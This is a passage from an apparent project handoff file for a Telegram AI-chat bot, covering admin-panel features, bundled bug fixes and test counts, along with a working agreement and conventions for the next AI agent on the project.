**Surface (web).** `web_admin.monetization` reads
`list_markup_history` + `get_markup_eras` after the existing
`get_monetization_summary` call, threading `markup_history` and
`markup_eras` into the template context. Both queries are
wrapped in `try/except` blocks that demote DB failures to empty
lists with a logged exception — the headline summary is still
useful even if the new cards are empty. `_MARKUP_HISTORY_LIMIT`
(25) and `_MARKUP_ERAS_LIMIT` (10) are hoisted to module
constants so the on-screen caps are pin-able from tests.

**Surface (template).** Two new panels in
`templates/admin/monetization.html` rendered between the
existing "Top users by revenue" panel and the "How to read these
numbers" panel:

* **Markup eras — revenue attribution.** Eight columns: `From`,
  `To` (`now` for the currently-running era), `Markup` (4-decimal
  precision), `Source` (badge), `Requests`, `Charged (USD)`,
  `Implied OR cost (USD)`, `Gross margin (USD)`. Empty state
  copy: *"No markup history recorded yet. Save a markup change
  above and it will start populating here on the next page
  render."*
* **Markup change history.** Six columns: `When`, `Actor`,
  `Action` (badge: `set` / `clear` / `unknown`), `Before` (with
  source caption), `After` (with source caption), `IP`. Empty
  state copy: *"No markup changes recorded yet. Every save /
  clear above is audit-logged and will appear here."*

The "How to read these numbers" footer panel also got a new
sentence pointing operators at the eras table for the
"did the markup change pay for itself?" question.

**Bundled bug fix.** The audit-log meta column is a JSONB blob
written by every admin handler — and the `before` / `after`
fields for `monetization_markup_update` arrive there as floats.
The decoder needs to handle:

* `None` (a row written before the field was populated, or a
  legacy schema variant) → `None` (so the template renders "—").
* `NaN` / `±Inf` (the existing `_finite_float_or_zero` helper
  would silently turn them into `0.0`, which lies — a markup of
  exactly zero would crash `get_markup_eras`'s
  `charged / markup` divide if it passed through).
* `bool` (a subclass of `int` — `True` would coerce to `1.0` via
  the implicit `float(value)` cast, silently corrupting the
  markup column with a nonsense value).
* Strings that look like numbers (a future writer using `str()`
  instead of the raw float, or a legacy row written by a
  different version of the handler).

`_finite_float_or_none` is the new helper that does this
defensively — paired with a unit test that pins the bool
rejection so a future "simplify by removing the isinstance
check" refactor can't sneak through.

`get_markup_eras` also clamps `markup <= 0` to
`openrouter_cost_usd = 0` rather than dividing by zero — defence
in depth for a future tampered audit row that bypasses the
`set_markup_override` validation paths.

**Tests.** All running, all green (2999 passed, 9 skipped — was
2971 baseline post-row-11, +28 new):

- `tests/test_database_queries.py` — 16 new tests covering
  `list_markup_history` (action filter, set / clear kind, unknown
  action demotion, per-row meta corruption tolerance, NaN/Inf
  drop, zero / negative / non-int limit handling, default-cap),
  `get_markup_eras` (synthetic-era for empty history, synthetic
  for empty usage_logs, two-era construction, corrupt-after-row
  skip, limit cap, empty-on-zero-limit, non-int limit rejection,
  zero-markup defence), and `_finite_float_or_none` (finite
  passthrough, None / invalid / NaN / Inf rejection, bool
  rejection).
- `tests/test_web_admin.py` — 7 new tests covering the
  monetization page renders (history card with one row,
  history empty-state, eras card with two rows, eras
  empty-state, history-query failure swallowed, eras-query
  failure swallowed, page passes the on-screen caps to the DB
  helpers).

### §10b.9 — Row #6 (FREE_MESSAGES_PER_USER editor) — shipped

**Why this was on the roadmap.** The trial allowance has historically
been pinned by a `FREE_MESSAGES_PER_USER` env var (default `10`). To
change it the operator had to edit the systemd unit file and restart
the bot — an outage, even if a brief one. The feature also had a
schema-level fallback: `users.free_messages_left` had `DEFAULT 10` on
the column. So if you only changed the env var, the SQL default would
still grant 10 to anyone who hit a code path that bypassed
`Database.create_user`. Two sources of truth, both invisible from the
admin panel.

The Stage-15-Step-E #10b table called for a web editor on
`/admin/wallet-config`. This row also had a substantive correctness
component: the editor needed to actually take effect, which meant
`Database.create_user` had to bind the resolved allowance to its
`INSERT INTO users (..., free_messages_left)` statement. A naive
"persist a row in `system_settings` and assume the rest of the bot
reads it" PR would have left the SQL `DEFAULT 10` as the actual
authority for new registrations.

**What's in this PR.**

* **`free_trial.py` (new module, 247 lines).** Mirrors
  `payments.py` (MIN_TOPUP_USD), `referral.py`
  (REFERRAL_BONUS_PERCENT / MAX_USD), and the
  `bot_health.py` loop-stale machinery. Public surface:
  * `DEFAULT_FREE_MESSAGES_PER_USER = 10`
  * `FREE_MESSAGES_PER_USER_MINIMUM = 0` (explicit zero is allowed —
    a "pay-to-play only" closed-beta is a real operator scenario)
  * `FREE_MESSAGES_PER_USER_MAXIMUM = 10_000` (a fat-finger upper
    limit; nobody should be granting 1M trial messages by accident)
  * `FREE_MESSAGES_PER_USER_SETTING_KEY = "free_messages_per_user"`
  * `_coerce_free_messages_per_user(value) → int | None` — strict
    typed coercer that **rejects `bool` even though
    `isinstance(True, int)` is True**, rejects `nan` / `inf`,
    rejects non-integer-valued floats (`2.7` is not a meaningful
    trial size; round-tripping it through the form would silently
    drop the fractional part), and rejects out-of-range values.
    Returns `None` to signal "drop, no fallback" rather than 0 — a
    silent fallback to 0 would secretly disable the trial.
  * `_FREE_MESSAGES_PER_USER_OVERRIDE` — process-local cache, set
    by `set_free_messages_per_user_override`, cleared by
    `clear_free_messages_per_user_override`, populated at boot
    (`main.py`) and on every `/admin/wallet-config` GET via
    `refresh_free_messages_per_user_override_from_db(db)`.
  * `refresh_*` is **fail-soft**: if the DB pool is down or
    returns a corrupt value, the previous cache is preserved (no
    mid-incident revert to env / default). If the row is missing,
    the cache is cleared (operator deleted it; falling through to
    env / default is the desired behaviour).
  * `get_free_messages_per_user()` — public lookup; resolution
    order is **override → env → default**.
  * `get_free_messages_per_user_source() → "db" | "env" |
    "default"` — used for the source badge on the panel + the
    audit-meta diff.

* **`database.py` (modified).** `Database.create_user(telegram_id,
  username)` now imports `free_trial`, resolves the allowance via
  `get_free_messages_per_user()`, and binds it as `$3` to the
  `INSERT INTO users (telegram_id, username, free_messages_left)`
  statement. The schema-level `DEFAULT 10` is preserved as a
  belt-and-suspenders fallback for any code path that bypasses this
  method, but the explicit `$3` is what makes a saved override
  actually apply to brand-new registrants. Existing users are
  unaffected (`ON CONFLICT (telegram_id) DO NOTHING`); to retroactively
  top up an existing user, the operator goes to `/admin/users/<id>`
  and uses the balance-adjust form.

* **`main.py` (modified).** Boot sequence now warms the
  free-messages override from `system_settings` immediately after
  the referral-bonus refresh and before the bot-health-alert
  refresh. Logs the loaded value, source, and effective value so an
  operator restarting the bot can confirm the override was picked up
  in one `journalctl -u meowassist | grep FREE_MESSAGES_PER_USER`.

* **`web_admin.py` (modified).**
  * `_build_free_messages_view()` — same shape as
    `_build_min_topup_view` and `_build_referral_view`: returns the
    effective value, source, default, env value (raw + parsed),
    override value, minimum, and maximum. The wallet-config GET
    handler refreshes the override from the DB before rendering, so
    a row written from a sibling Devin instance (or from a pgAdmin
    one-liner) appears on the next page load.
  * `wallet_config_get()` — calls
    `free_trial.refresh_free_messages_per_user_override_from_db(db)`
    in a try-except (DB hiccup must not 500 the page) and passes
    the new view dict into the template context.
  * `wallet_config_free_messages_post(request)` — operator-floored
    (`_require_role(ROLE_OPERATOR)`). CSRF guard first, DB-presence
    check next (returns to `/admin/wallet-config` with an error
    flash if the app's DB pool is None, so a misconfigured
    deployment doesn't crash). Empty form value → delete the row +
    clear the cache + audit a `clear` action. Filled value → strict
    coerce, upsert, set override, refresh, audit a `set` action.
    The audit `meta` carries `before` / `before_source` / `after` /
    `after_source` so an investigation pinpointing "why did the
    funnel rate change?" can attribute the change to a specific
    operator's knob tweak vs. an unrelated signup-funnel shift.
  * Route registration: `POST /admin/wallet-config/free-messages`,
    operator-floored. The economic blast radius (free messages =
    OpenRouter cost we eat directly) earns a higher floor than a
    pure read.
  * `AUDIT_ACTION_LABELS["wallet_config_free_messages_update"] =
    "Trial allowance updated"` so the dropdown filter on
    `/admin/audit` lets you isolate "trial-allowance changes only".

* **`templates/admin/wallet_config.html` (modified).** New panel
  card after the referral card. Shows effective allowance + source
  badge + a 4-row breakdown table (DB override / env / default /
  effective) so a "we said the override was 5 but the bot's still
  granting 10" report is debuggable from the page itself. Form has
  a numeric input with `step=1`, `min=0`, `max=10_000`, plus
  explanatory text about the new-registrants-only semantics and a
  pointer to `/admin/users/<id>` for retroactive top-ups.

* **`tests/test_free_trial.py` (new file, 56 tests).** Coercion
  happy-path (int passthrough, string-to-int, int-valued floats),
  rejections (bool, nan, inf, out-of-range, non-numeric, non-integer
  floats), override set/clear/get round-trip, resolution-order
  matrix (override → env → default), source-tracking matrix,
  async refresh-from-DB scenarios (valid load, missing row, invalid
  stored value, DB error preserves previous cache, None DB returns
  current cache, out-of-range row clears cache, negative row clears
  cache), and a `Database.create_user` wiring test that pins the
  SQL parameter binding so a future refactor that "accidentally"
  drops `$3` blows up at test time rather than silently regressing
  to the schema-level `DEFAULT 10`.

* **`tests/test_web_admin.py` (modified, +10 tests).** Renders the
  editor form (CSRF + breakdown), CSRF guard, persists value +
  refreshes cache, blank value clears the override, parameterised
  rejection of bad values (non-numeric, nan, inf, negative,
  non-integer, above cap, well above cap), accepts the explicit
  zero (closed-beta path), accepts the inclusive maximum, DB
  upsert failure keeps the previous value (no cache poisoning),
  audit-meta diff carries before/after with sources.

**Test counts.** 56 new unit tests in `test_free_trial.py` + 10 new
web tests in `test_web_admin.py` = **66 net new tests**. Total
suite: 3072 passed, 9 skipped (was 2999 / 9 before this PR). All 4
CI checks (docker build, pytest 3.11, pytest 3.12, alembic
roundtrip) green.

---

## 11. Working agreement (read this first if you're the next AI)

The user's process for this project — **do not deviate**:

1. **Push PRs autonomously, sequentially, without blocking on per-PR
   approval.** The user explicitly said (2026-04-28): *"I'm going to sleep
   so don't wait for my approval on every pull. I pull all of them when I
   wake up. Just move forward step by step. Stick to the plan."* Take this
   as standing instruction unless the user says otherwise.

2. **One PR per logical step.** Don't bundle "scaffold web admin" with
   "promo codes UI" with "gift codes". Small, reviewable PRs.

3. **Bundle a real bug fix in every PR.** The user explicitly asked for
   this. Find an actual latent bug in the codebase — defensive guards for
   edge cases, off-by-ones, race-condition fixes, etc. **Do not invent
   fake bugs.** If you genuinely cannot find one for a given PR (e.g. a
   pure deletion PR like cleanup), pair it with a small defensive
   refactor + test. Document the bug in the PR description.

4. **Update HANDOFF.md and README.md in every PR.** The user explicitly
   asked: *"remember change your read me file and your guide for next AI in
   every single merge u push. I want to have a record on what we have when
   you are finished in every step."* The HANDOFF.md you're reading right
   now is that running record. Keep it current. Future AIs / humans will
   pick the project up from this file alone.

5. **Branch naming:** `devin/$(date +%s)-<short-description>`.

6. **PR template:** call `git_pr(action="fetch_template")` then
   `git_pr(action="create")`. The create call enforces fetch first.

7. **Never modify a test to make it pass.** Fix the code or the assumption.

8. **CI must be green before reporting completion.** Run
   `git(action="pr_checks", wait_mode="all")` after creating each PR.
   If a check fails, fix it (don't report success). The user merges manually
   when they wake up — they expect green PRs ready to merge.

9. **Devin Review feedback is real.** Treat the bot's PR-review comments
   as if a senior engineer wrote them. PR #50's Devin Review caught a real
   Markdown-escape bug; PR #44's caught the URL-encode-credentials bug.
   Both became hotfix PRs. Read the review on every PR and respond to it.

10. **Respect the live deploy.** `/root/bot_project` on the user's VPS is
    sacred. Don't ssh in, don't modify it, don't reference it as anything
    other than "the live deploy".

### Branch / commit conventions
- Branch: `devin/$(date +%s)-<description>` (timestamp + kebab-case slug).
- Commit message: `<type>(<scope>): <subject> [<stage-ref>]`
  e.g. `feat(admin): broadcast + Markdown-escape fix [Stage-7-Part-4]`
- Co-author Devin on every commit (handled automatically by the tool).

### Git etiquette
- **Never** `git add .` (catches stray files). Stage explicitly.
- **Never** `--force` push to main / master.
- **Never** `--no-verify` to skip pre-commit hooks (we don't have any
  configured, but if the user adds them, respect them).
- **Never** amend a commit. Add a new commit on top.

---

## 12. Glossary / odd things

- **IPN** = Instant Payment Notification (NowPayments' webhook).
- **FSM** = aiogram per-chat finite state machine. Backed by Redis (PR #46).
- **`COST_MARKUP`** env var, default 1.5×. Multiplier on raw OpenRouter cost.
- **`MEMORY_CONTENT_MAX_CHARS`** = 8000 (per-message buffer cap).
- **`MEMORY_CONTEXT_LIMIT`** = 30 (recent turns fed back as context).
- **`partially_paid`** = NowPayments status. User paid less than invoice.
  Credit proportional USD, NOT zero.
- **`amount_usd_credited`** has dual semantics by row state:
  - PENDING: *intended* credit at invoice creation.
  - PARTIAL/SUCCESS: *cumulative* USD already credited.
- **NowPayments source IP**: `51.75.77.69` (per prod log; not stable, don't
  gate on it — gate on HMAC).
- **NowPayments docs**: <https://documenter.getpostman.com/view/7907941/2s93JusNJt#api-documentation>
- **Bot handle**: `@Meowassist_Ai_bot` (id `8761211112`).
- **Live deploy**: `/root/bot_project`. Don't touch.

---

## 13. TL;DR

1. **All P0 / P1 / P2 / P3-Op / Stage-7 + Cleanup are shipped and merged.**
2. **Stage-8 Parts 1–6 are shipped (the whole web panel is done).**
   Reachable at `${WEBHOOK_BASE_URL}/admin/login` once
   `ADMIN_PASSWORD` + `ADMIN_SESSION_SECRET` are set in the live
   deploy. Promo codes at `/admin/promos`, gift codes at
   `/admin/gifts`, users at `/admin/users` (search → detail →
   credit/debit), broadcast at `/admin/broadcast` (form + live-polling
   detail page), transactions browser at `/admin/transactions`
   (paginated, filter by gateway/status/user, link through to the
   user-detail page). Web-initiated balance adjustments are attributed
   with `admin_telegram_id=0` sentinel and a `[web]` prefix in
   `transactions.notes` so the audit trail distinguishes web vs
   Telegram-DM adjustments. Users redeem gift codes with
   `/redeem CODE` in the bot.
3. **The IPN signature bug is fixed on `main`** (PRs #39 + #41). User
   confirmed clean log on 2026-04-28.
4. **Stage-9 queue is fully shipped** — all 10 steps merged (PRs #60 →
   #71-ish through PR #88 for Step-9). Admin login throttle, audit log,
   2FA, IPN replay-dedupe, pending-payment reaper, soft-cancel
   broadcasts, CSV export, per-user usage browser, dashboard pending
   tile, durable broadcast registry — all live.
5. **Stage-10 is fully shipped** — A (per-currency min-amount
   preflight + alt-coin suggestion, PR #92), B (markup-inclusive prices
   in model picker, PR #94), C (auto-discover new OpenRouter models +
   admin DM, PR #95), D (auto-refresh catalog prices + >20% delta DMs,
   PR #96).
6. **Stage-11 is fully shipped** — A (live USD→Toman ticker, PR #97),
   B (dual-currency top-up entry, PR #98), C (TetraPay Rial gateway +
   per-invoice rate lock, PR #100), D (wallet shows USD + live Toman
   annotation, PR #99). Toman is display/input only; wallet stays
   USD-denominated.
7. **Stage-12 fully shipped** — A (refunds/chargebacks UI),
   B (stuck-payment proactive admin DM), C (user-side TetraPay
   receipts in `/wallet`), D (gift-code redemption stats web page).
8. **Stage-13 queue is set** — see §5 "Stage-13 queue" table.
   A (required-channel subscription gate, P2 product) merged as PR
   #107. B (per-user in-flight cap on AI chat path + null-content
   reply guard, P0 cost-correctness) merged as PR #108. Aplus
   (wallet_text + redeem_ok NaN guard rollout — finishes the work
   Step-A's comment claimed was already done) merged as PR #109.
   C (referral codes user-to-user invites + bundled `/start
   <payload>` deep-link bug fix, P2 product) shipped this PR.
   Remaining: D (Prometheus `/metrics` endpoint, P3 ops) — carried to
   Stage-15-Step-A. User direction 2026-04-30: walk down the list one
   PR at a time.
9. **Stage-14 is fully shipped** — A+B (admin model & gateway toggles,
   `disabled_models` + `disabled_gateways` tables, web panel pages at
   `/admin/models` + `/admin/gateways`, alembic 0015, audit-logged
   enable/disable actions, in-memory caches for zero-cost hot-path
   checks, disabled-model guard in `ai_engine.chat_with_model` +
   `handlers._eligible_model`, disabled-gateway guard in currency
   pickers). C (multi-key OpenRouter load balancing via
   `OPENROUTER_API_KEY_1..10` env vars, sticky per-user key
   assignment `telegram_id % N`, backward-compatible with single
   `OPENROUTER_API_KEY`, module `openrouter_keys.py`).
10. **Stage-15 in progress** — see §"Stage-15" in this file.
    B (server update script with backup rotation) and C
    (logos/posters AI prompt folder) shipped as PR #112.
    A (Prometheus `/metrics` endpoint) shipped PR #113 with bundled
    bug fix Stage-15-Step-D #1 (`_active_pay_currencies` no longer
    surfaces NowPayments tickers when `NOWPAYMENTS_API_KEY` is
    unset). D #3-extension (`admin_toggles` refresh fail-soft) PR
    #114; D #6 (FIFO inflight eviction switch from `set` to `dict`)
    PR #115. D #2 (lazy-load `openrouter_keys`) PR #116 with
    bundled bug fix: Prometheus label-value escaping in
    `metrics._format_labelled_counter`. D #5 (IPN-health
    dashboard tile) PR #117 with bundled bug fix:
    `admin.format_metrics` now surfaces the
    `pending_payments_over_threshold_count` sub-line so the
    Telegram-side `/admin_metrics` digest matches the web
    `/admin/` dashboard. **D #3 / #4 (race-condition audit doc +
    model-id slash routing audit) shipped this PR** with bundled
    bug fix: write-side fail-soft on the toggle handlers
    (`_models_toggle_post`, `_gateways_toggle_post`) so a
    transient DB error during the canonical write renders a
    flash error and a clean 302 instead of a 500 — complementing
    PR #114 which only made the *post-write resync* fail-soft.
    Remaining: nothing in Stage-15-Step-D. Stage-15-Step-E is
    doc-only and the 12 suggestions are already enumerated above.
    **Stage-15-Step-E #1 MERGED** (PR #119) — first slice of
    "conversation history persistence & export". Bundled bug fix
    in #1: `metrics._format_help_and_type` now escapes `\` and
    newline in HELP text per the Prometheus exposition spec.
    **Stage-15-Step-E #2 MERGED** (PR #120) — first slice of
    "spending analytics for users": new
    `Database.get_user_spending_summary`, new `user_stats`
    formatter, new "📊 My usage stats" button on the wallet
    menu. Bundled bug fix in #2:
    `conversation_export.format_history_as_text` now returns
    `(text, kept_count)` so the memory-export caption + toast
    report the actually-kept count after a 1 MB trim.
    **Stage-15-Step-E #3 MERGED** (PR #121) — first slice of
    "webhook mode instead of long-polling": new
    `telegram_webhook.py` module gates Telegram updates behind a
    secret token (header AND path). Bundled bug fix in #3:
    `webhook_rate_limit_middleware` now protects the TetraPay
    endpoint instead of just `/nowpayments-webhook`.
    **Stage-15-Step-E #4 MERGED** (PR #122) — first slice of
    "rate limiting per OpenRouter key": `openrouter_keys.py`
    extended with a per-key 429 cooldown table and a fall-through
    selection policy. Bundled bug fix in #4:
    `pricing._apply_markup` now NaN/Inf/non-numeric/negative-guards
    the token-count side too, not just the price side.
    **Stage-15-Step-E #5 MERGED** (PR #123) — first slice of
    "admin role system": new `admin_roles` table + `admin_roles.py`
    module owning the `viewer`/`operator`/`super` hierarchy +
    `Database.get/set/delete/list_admin_roles` CRUD primitives +
    three new Telegram commands (`/admin_role_grant <user_id>
    <role> [notes]`, `/admin_role_revoke <user_id>`,
    `/admin_role_list`). Bundled bug fix in #5:
    `Database.list_admin_audit_log` and
    `Database.list_payment_status_transitions` now decode JSONB
    `meta` columns through a new `_decode_jsonb_meta` helper
    instead of `dict(r["meta"])` — fixes a silent
    "Database query failed" on the audit page in production
    once the table has any non-NULL `meta` row.
    **Stage-15-Step-E #6 MERGED** (PR #124) — first slice of
    "automated testing with real Telegram": new
    `tests/integration/` directory with a Telethon-based opt-in
    suite that drives a live test bot via Telegram MTProto, plus
    four smoke tests (`/start` greeting, `/start` hub message
    with inline keyboard, `/balance` returns dollar amount,
    unknown-command does not wedge the bot). Skips itself in CI
    when `TG_API_ID` / `TG_API_HASH` / `TG_TEST_SESSION_STRING`
    / `TG_TEST_BOT_USERNAME` are unset (which is the default,
    so CI stays green). Bundled bug fix in #6:
    `model_discovery._parse_float_env` and `fx_rates._parse_float_env`
    now reject non-finite values (`nan` / `inf` / `-inf`)
    explicitly via `math.isfinite(value)`, instead of accepting
    them as `float()` parses them and silently disabling the
    downstream threshold-comparison-driven alert paths
    (`abs(delta) >= NaN` is always False; `abs(delta) >= +Inf`
    is False for any finite delta).
    **Stage-15-Step-E #7 STARTED (this PR)** — first slice of
    "i18n framework upgrade": new `i18n_po.py` module with
    `dump_po(lang)` + `load_po(text)` round-trip, CLI
    `python -m i18n_po export|check`, and `locale/fa/LC_MESSAGES/messages.po`
    + `locale/en/LC_MESSAGES/messages.po` checked-in artifacts.
    Translators can now use Poedit / Crowdin / OmegaT on the
    `.po` files instead of editing the 1146-line `strings.py`
    Python literal. The bot's runtime keeps reading
    `strings._STRINGS` for now — gettext-at-runtime
    (`gettext.gettext()` / `ngettext()` replacing `t()`) is the
    next slice. CI drift gate: a test in `tests/test_i18n_po.py`
    invokes `i18n_po._check_locale_files` so adding a slug to
    `strings.py` without re-exporting fails the build with a
    clear "Run: python -m i18n_po export" message. Bundled bug
    fix in #7: `strings.extract_format_fields` now descends into
    the format-spec portion of every placeholder. Pre-fix, a
    nested kwarg like `{amount:.{precision}f}` returned
    `{"amount"}` only; `validate_override` then accepted an
    override that referenced `{precision}` only via the spec,
    and the runtime `template.format(**kwargs)` raised
    `KeyError` for the missing nested kwarg, falling through to
    the bare-slug fallback so the operator's override silently
    never rendered. Fix is a recursive call into `format_spec`
    inside the loop; 9 new `TestExtractFormatFieldsNestedSpec`
    tests pin the cases. See "Stage-15-Step-E #7 — what's
    shipped vs. what remains" section above for the precise
    boundary so the next AI can continue.
    **Stage-15-Step-E #5 follow-up #1 STARTED (this PR)** —
    "wire `role_at_least` into the existing admin command gates".
    The first slice of #5 (PR #123) shipped the role table + the
    role-CRUD commands but kept every other `/admin_*` handler
    gated on the flat env-list `is_admin` predicate, so a
    DB-tracked viewer/operator had no real reduced surface — the
    role record only showed up in the audit log. This PR adds
    `admin._resolve_actor_role` (DB lookup → env-list fallback;
    fail-soft on DB pool errors so a transient flake doesn't
    downgrade a legacy admin mid-incident) + `_require_role(
    message, required)` and wires them into every gated handler:
    `/admin_metrics` and `/admin_balance` at `viewer`,
    `/admin_broadcast` at `operator`, `/admin_credit` /
    `/admin_debit` / `/admin_promo_create` / `/admin_promo_list`
    / `/admin_promo_revoke` at `super`. The `/admin_role_*`
    handlers stay env-list-only — a DB-tracked super must NOT be
    able to self-promote out of the role table. The `/admin` hub
    message is rendered by `_render_admin_hub(role, is_env_admin=...)`
    and only lists rows the actor can actually drive (a viewer
    sees just `/admin_metrics` + `/admin_balance`). 17 new
    regression tests pin the gate matrix per (role × handler),
    plus the env-list backward-compat fallback, the
    DB-role-wins-over-env-list contract, the no-from-user
    defence-in-depth path, and the role-CRUD-stays-env-list
    invariant. Bundled bug fix: `web_admin.AUDIT_ACTION_LABELS`
    was missing the `role_grant` and `role_revoke` slugs (which
    `Database.record_admin_audit` was already storing at the
    `/admin_role_grant` / `/admin_role_revoke` Telegram handlers
    since PR #123). The audit rows themselves were stored
    correctly, but an operator filtering the `/admin/audit` feed
    to "role changes only" while reviewing who got promoted /
    demoted couldn't pick those slugs out of the dropdown — they
    had to scroll the full unfiltered feed. Same regression
    pattern as the bundled fix in Stage-15-Step-F follow-up #3
    (PR #134) for the five `control_*` slugs; that sweep missed
    the role slugs because they pre-date Step-F. New regression
    test `test_audit_filter_dropdown_includes_role_crud_actions`
    pins both labels so a future PR can't drop them again.
11. **Stage-15-Step-E #4 follow-up #1 MERGED** (PR-after-#136) —
    closes the two biggest open Step-E #4 TODOs in one PR:
    `/admin/openrouter-keys` ops view + per-key Prometheus
    counters. The web page renders one row per pool slot with
    cooldown status, remaining seconds, the per-key 429 count,
    and the per-key fallback count. Three new Prometheus
    families exposed off `/metrics`:
    `meowassist_openrouter_key_429_total{index="N"}` (counter,
    bumped every time `mark_key_rate_limited` registers a fresh
    cooldown for a slot); `meowassist_openrouter_key_fallback_total{index="N"}`
    (counter, bumped every time `key_for_user` walked forward
    off the user's hot sticky and another slot absorbed the
    request — labelled by the absorbing index, so a "fallback
    rate per key" plot answers 'which key is taking the load
    when others go hot'); and
    `meowassist_openrouter_key_cooldown_remaining_seconds{index="N"}`
    (gauge, available slots render 0 so a PromQL `> 0` filter
    cleanly catches the cooled keys). Counters are reset on a
    deliberate `load_keys()` call so a key rotation doesn't
    carry stale per-index meaning forward; key material itself
    is **never** rendered into the web page or the metrics
    body — every surface keys by 0-based pool index only.
    Bundled bug fix: `load_keys()` now evicts cooldown entries
    whose api_key isn't in the freshly-loaded pool. Pre-fix, a
    hot key rotation (operator script that swaps keys to dodge
    upstream throttling) left stale cooldown entries in
    `_cooldowns` for up to `MAX_COOLDOWN_SECS` (1 h) — within
    that window the cooldown table size was no longer bounded
    by `len(_keys)`, violating the invariant the comment near
    `_cooldowns`'s definition explicitly promises. On a tight
    rotation cycle the table grew unbounded for the first hour
    after every swap before eventually settling. New regression
    tests: 12 in `tests/test_openrouter_keys.py` (counter
    initialisation, increment lifecycle, absorber-vs-source
    semantics, no-fallback-on-sticky-available, no-fallback-on-all-cooled,
    counter reset on load_keys, the bundled cooldown-eviction
    bug fix, and the no-stale-counter-on-rotation contract);
    4 in `tests/test_metrics.py` (the three new metric
    families render with correct HELP/TYPE preambles and label
    rows, plus an empty-pool case that verifies HELP/TYPE
    preambles still emit without data rows so PromQL `rate(...)`
    queries don't blow up against an absent counter); and 6 in
    `tests/test_web_admin.py` (auth gate, three-row render,
    cooldown-status row, per-key counter render, no-api-key-leak
    invariant, and empty-pool empty-state copy). Sidebar nav
    link `🔑 OpenRouter keys` added to `_layout.html` so the
    page is discoverable from any admin tab.
12. **Stage-15-Step-E #3 follow-up #1 MERGED** (PR-after-#137) —
    closes three of the four remaining Step-E #3 TODOs in one PR:
    `set_webhook` retry-with-backoff on transient 5xx /
    `TelegramNetworkError` (3 attempts, 1s/2s/4s exponential
    backoff by default, configurable via
    `TELEGRAM_WEBHOOK_REGISTER_MAX_ATTEMPTS` /
    `TELEGRAM_WEBHOOK_REGISTER_BASE_DELAY_SECONDS`);
    `TelegramBadRequest` is **not** retried because a 400 is a
    deploy-side typo (bad URL, malformed secret_token) and
    burning retries on it just delays the loud failure the
    operator needs to fix. Opt-in IP-allowlist for the Telegram
    webhook receiver via `TELEGRAM_WEBHOOK_IP_ALLOWLIST` —
    special value `default` expands to Telegram's documented
    delivery ranges (`149.154.160.0/20`, `91.108.4.0/22`); a
    comma-separated CIDR list is also accepted; default-off so
    existing deploys aren't accidentally locked out; layered on
    top of the secret check (defence-in-depth — the secret
    guards against a leaked URL, the IP allowlist guards against
    a leaked URL **plus** a leaked secret since a forged request
    can't easily originate from Telegram's published delivery
    IPs); request-time check trusts only `request.remote` (NOT
    `X-Forwarded-For`), mirroring `metrics._client_ip`'s defence
    against a public-facing reverse proxy that can be tricked
    into spoofing the header. Stateless `GET
    /telegram-webhook/healthz` probe — 200 OK with a tiny
    `{"status":"ok","webhook_prefix":"<prefix>"}` JSON; never
    leaks the secret, the URL, or the path; doesn't talk to
    Telegram (no rate-limit budget tax) or the DB (no fan-out
    on a probe storm); not in the rate-limited path set so a
    load balancer probing every 5s can't fight the bucket
    against real updates. Bundled bug fix: `_resolve_path` now
    falls back to the documented default when
    `TELEGRAM_WEBHOOK_PATH_PREFIX` strips down to empty (`""`,
    `"/"`, `"///"`, …). Pre-fix, an empty prefix produced
    `"//<secret>"` (double leading slash) — aiohttp registers
    that as a route at `//<secret>` while incoming requests get
    canonicalised to `/<secret>`, the route silently 404s every
    Telegram delivery, and Telegram itself accepts the
    double-slash URL on `set_webhook` so the bot reports the
    webhook as registered while in fact every update is
    dropped. Operator-visible signal: log warning + `cfg.path`
    inspection now matches the route the deployer expected.
    27 new tests in `tests/test_telegram_webhook.py` covering:
    the bundled `_resolve_path` fix (3 inputs that strip to
    empty, the no-warn case for explicit prefixes, end-to-end
    via `load_webhook_config`); the retry loop (happy path,
    recover from one transient 5xx, full exponential backoff
    schedule, no-retry on `TelegramBadRequest`, recover from
    `TelegramNetworkError`, env override at call time, env
    helper falls back on garbage); the IP allowlist (returns
    None when unset, default expands to Telegram ranges,
    case-insensitive, explicit CIDR list, drops malformed
    entries fail-soft, all-malformed returns None,
    middleware passes admin traffic through, allows
    Telegram-IP request, rejects outside-range request,
    rejects unparseable remote, no-op when state missing,
    install-with-no-env stores empty allowlist); and the
    healthz route (path strips secret, custom prefix
    preserved, 200 OK, no-secret-leak in body, no auth
    required, not in rate-limited path set). Total suite:
    1944 tests passing (was 1917 + 27 new).
13. **Stage-15-Step-E #2 follow-up #1 MERGED** (PR-after-#138) —
    closes two of the four remaining Step-E #2 TODOs in one PR:
    `/stats` slash-command alias + window selector buttons.
    `cmd_stats` (`Command("stats")`) renders the same per-user
    spending dashboard as the wallet-menu button, but as a fresh
    `message.answer` bubble instead of an in-place `edit_text` —
    typing a slash command should land as its own bubble, not
    silently rewrite some scrolled-up older message. Optional
    positional arg picks a non-default window: `/stats 7` /
    `/stats 90` / `/stats 365` (recognised choices: 7, 30, 90,
    365). Garbage args (`/stats abc`, `/stats -7`, `/stats 99999`)
    silently coerce to the 30d default — same forgiveness policy
    as the receipts-pagination cursor. The `/stats@bot` suffix
    shape that Telegram uses in group chats parses identically to
    the bare slash. Window selector lives on the stats screen
    itself: 4 inline buttons (`7d` / `30d` / `90d` / `365d`),
    callback shape `stats_window:<days>`, the currently-selected
    button is prefixed with `✓` so the user can tell which one
    they're on without scrolling to the section header. Click
    re-renders the same screen with the new window via
    `stats_window_select_handler`. An unrecognised callback value
    (stale-deploy callback, hand-crafted client) falls back to
    30d rather than 500-ing — same fail-soft posture as the
    healthz / IP-allowlist work in PR-#138. Refactor: both the
    slash-command path and the wallet-menu callback now route
    through `_build_stats_render(user_id, lang, window_days=…)`
    so the two surfaces can never drift on copy, layout, or
    keyboard shape. New i18n string `stats_window_btn` (FA: "X
    روزه", EN: "Xd"). Bundled bug fix:
    `user_stats._iter_top_models` now honours its docstring and
    drops `top_models` rows whose `cost_usd` / `calls` is
    non-finite, instead of silently coercing them to `0.0` /
    `0` via `_safe_float` / `_safe_int`. Pre-fix, a corrupted
    aggregate (operator-injected bogus `cost_deducted_usd` rows
    landing as `Decimal('Infinity')` in `SUM` → asyncpg → `float`
    cast → `inf`) showed up in the user-facing screen as "you
    spent $0.0000 on model X" — a confident lie about which
    model the spend went to. Post-fix the row is dropped entirely
    so the "top models" list shrinks rather than misattributes
    spend. `bool` values (which silently subclassed off `int` and
    rendered `True` as `$1.00`) are now also rejected. Same
    explicit `bool` rejection that `_safe_float` / `_safe_int`
    already do, just lifted out into a shared
